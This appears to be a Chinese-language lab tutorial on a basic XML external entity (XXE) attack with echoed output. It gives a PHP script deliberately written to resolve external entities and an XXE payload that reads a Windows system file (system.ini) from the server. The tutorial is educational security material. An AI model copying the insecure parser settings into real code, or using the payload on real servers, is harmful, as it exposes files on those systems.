# 案列一：有回显读本地敏感文件(Normal XXE)

这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件

本地服务器上放上解析 XML 的 php 代码：

示例代码：

xml.php

```
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;

?>
```

payload:

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
<creds>&goodies;</creds>
```

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7xwo9c5btj30qk0kdjt4.jpg)

成功读取到目标系统的`system.ini `

